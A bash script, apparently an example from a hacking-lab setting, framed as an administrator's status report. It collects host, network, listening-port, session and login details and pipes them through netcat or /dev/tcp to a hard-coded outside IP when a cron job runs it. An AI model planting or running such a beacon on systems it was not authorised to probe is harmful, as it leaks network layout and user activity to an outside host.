#!/bin/bash
# HMV example script: send a status report back to the administrator.
#
# USE CASE
#   HMV discards a script's output, so to see anything you must send it out.
#   This script gathers status, network and session info and pipes it to a
#   listening netcat on your machine (the administrator), giving you a snapshot
#   of a server you cannot otherwise reach.
#
# HOW IT WORKS
#   On your machine, first start a listener:
#       nc -lvnp 4445 > report.txt
#   Then publish this script. On the next cron run the server connects to
#   HOST:PORT and streams its report; then the connection closes.
#
# RUN AT YOUR OWN RISK
#   The report can contain hostnames, IPs, usernames and listening ports. Send
#   it only to a listener you control, on a trusted path.

HOST="203.0.113.7"   # <-- the machine where you run your nc listener
PORT=4445

report () {
    echo "===== HOST ====="
    uname -a
    hostname
    echo

    echo "===== UPTIME / LOAD ====="
    uptime
    echo

    echo "===== DISK ====="
    df -h
    echo

    echo "===== MEMORY ====="
    free -h 2>/dev/null || cat /proc/meminfo | head -5
    echo

    echo "===== TOP PROCESSES ====="
    ps aux --sort=-%cpu 2>/dev/null | head -15 || ps aux | head -15
    echo

    echo "===== NETWORK INTERFACES ====="
    ip addr 2>/dev/null || ifconfig -a 2>/dev/null
    echo

    echo "===== ROUTES ====="
    ip route 2>/dev/null || route -n 2>/dev/null
    echo

    echo "===== LISTENING PORTS ====="
    (ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null) | head -40
    echo

    echo "===== WHO / SESSIONS ====="
    who -a 2>/dev/null
    echo

    echo "===== LAST LOGINS ====="
    last -n 15 2>/dev/null
    echo

    echo "===== END OF REPORT ====="
}

if command -v nc >/dev/null 2>&1; then
    report | nc "$HOST" "$PORT"
elif command -v ncat >/dev/null 2>&1; then
    report | ncat "$HOST" "$PORT"
elif [ -d /dev/tcp ]; then
    report > "/dev/tcp/$HOST/$PORT"
else
    echo "hmv-example: no nc/ncat and no /dev/tcp, cannot send report" >&2
    exit 1
fi

echo "hmv-example: report sent to $HOST:$PORT" >&2
